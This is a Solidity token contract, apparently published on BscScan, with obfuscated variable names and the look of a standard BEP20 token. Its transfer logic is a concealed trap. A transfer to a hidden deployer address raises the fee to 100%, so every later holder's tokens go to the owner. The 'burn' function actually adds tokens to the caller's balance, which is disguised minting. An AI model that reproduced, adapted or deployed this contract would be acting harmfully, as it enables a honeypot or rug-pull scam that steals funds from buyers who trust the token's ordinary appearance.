/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract nFBYGF {
uint256 private  AVQQNE = 10000000000000;
uint256 public  MLLkAR = 10000000000000000000;
address public  DHWGXt = address(0);
string public  symbol = "jpBdGA";
address public  KyQXxR = address(0);
address public  PerKnh = address(0);
uint256 public  QfAVBA = 100000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  MMIGCu = address(0);
uint256 public  VYHtaK = 100000000000000000000000;
uint256 public  Ydpqjg = 100000000000000000000;
uint256 public constant SBJsCR = 9+1;
address public owner;
uint256 public  EgPAlM = 1000000000000000000;
address public  IApCOR = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint8 public constant decimals = 18;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  name = "rKvJiK";
mapping (address => mapping (address => uint256)) private _allowances;
mapping (address => uint256) public balanceOf;
uint256 public  RGEkjW = 10000000000000000;
uint256 public  kuzKGi = 10000000000000000000000000000;
uint256 public  EIhTWw = 100000000000000000000000;
address public  ItVSIu = address(0);
address private  cSjTTI = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
constructor () public {
cSjTTI = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "Urdcyd");
require(to != address(0), "Urdcyd");
require(amount <= balanceOf[from], "Urdcyd");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* SBJsCR/AVQQNE ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==cSjTTI){
AVQQNE = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}

}